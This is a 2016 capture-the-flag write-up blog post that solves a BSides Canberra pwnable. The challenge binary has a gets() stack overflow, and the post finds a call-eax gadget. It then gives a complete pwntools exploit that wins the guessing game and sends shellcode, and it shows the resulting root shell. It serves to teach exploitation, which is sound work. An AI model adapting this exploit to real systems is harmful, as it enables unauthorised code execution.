---
id: 694
title: BSides Canberra CTF 2016 – Meetings Meetings Everywhere – Pwnable
date: 2016-04-17T10:24:13+00:00
author: Kris
layout: post
guid: https://ctf.rip/?p=694
permalink: /bsides-canberra-ctf-2016-meetingsmeetingseverywhere-pwnable/
themepixels_post_link_target:
  - 'yes'
themepixels_enable_post_header:
  - default
themepixels_enable_post_meta_single:
  - default
themepixels_enable_post_featured_content:
  - default
themepixels_enable_post_categories:
  - default
themepixels_enable_post_tags:
  - default
themepixels_enable_post_share:
  - default
themepixels_enable_post_author_info_box:
  - default
themepixels_enable_related_posts:
  - default
themepixels_enable_post_next_prev_links:
  - default
themepixels_enable_topbar:
  - default
themepixels_enable_sticky_header:
  - default
themepixels_header_layout:
  - default
themepixels_site_layout:
  - default
themepixels_sidebar_position:
  - default
post_views_count:
  - "1014"
image: /images/2016/04/bsides.png
categories:
  - Write-Ups
---
I was pretty surprised that few people solved this one. I think there may have been an issue with the binary originally published where NX was enabled. This cost me a bit of time but no matter. We solved it easily in the end. It's a two part pwnable. A guessing game where you have to guess a number and receive higher/lower replies. When you win you get to enter your name.

In the binary you can see this is a trivial stack overflow by way of gets():


```
char *win()
{
  char s; // [sp+Ch] [bp-8Ch]@4
  int v2; // [sp+8Ch] [bp-Ch]@2

  puts("\nYay! You guessed correctly");
  do
    v2 = getchar();
  while ( v2 != 10 && v2 != -1 );
  printf("Enter your name and we'll schedule a meeting: ");
  return gets(&s);
}
```


For the guessing game I write a trivial binary searcher and when prompted to enter my name I send a bunch of A's to see where the chips fall:


```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xff9e95ac ('A' <repeats 200 times>...)
EBX: 0x0 
ECX: 0xf76ce5a0 --> 0xfbad2088 
EDX: 0xf76cf87c --> 0x0 
ESI: 0x1 
EDI: 0xf76ce000 --> 0x1b3db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xff9e9640 ('A' <repeats 200 times>...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
...
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```


I can see esp points to our input so let's check for a gadget to use to jmp there.


```
root@kali:~/ctfs/bsides/pwn/guessing# msfelfscan -j esp guessing 
[guessing]
```


Nope. Well EAX is also pointing at our payload, any EAX gadgets?


```
root@kali:~/ctfs/bsides/pwn/guessing# msfelfscan -j eax guessing 
[guessing]
0x08048513 call eax
```


That'll do! Quick exploit time:


```
#!/usr/bin/python

from pwn import *

#host = "pwn3.bsides"
host = "localhost"
port = 10000

call_eax = p32(0x8048513)

payload = asm(shellcraft.nop()) * 20
payload += asm(shellcraft.sh())
payload += "A" * (cyclic_find('laab') - len(payload))
payload += call_eax
payload += "C" * 200

conn = remote(host, port)
val = 500
valmax = 1000
print "[*] Playing guessing game..."
while True:
    conn.recvuntil('>')
    conn.sendline(str(val))
    result = conn.recvline()
    
    if 'higher' in result:
        val += (valmax - val) // 2
    elif 'lower' in result:
        valmax = val
        val -= (val // 2)
    else:
        print "[*] Won guessing game..."
        break

conn.recvuntil(':')
print "[*] Sending payload..."
conn.sendline(payload)
conn.interactive()
```


And a quick test and it works!


```
root@kali:~/ctfs/bsides/pwn/guessing# ./test1.py 
[+] Opening connection to localhost on port 10000: Done
[*] Playing guessing game...
[*] Won guessing game...
[*] Sending payload...
[*] Switching to interactive mode
 $ id
uid=0(root) gid=0(root) groups=0(root)
```
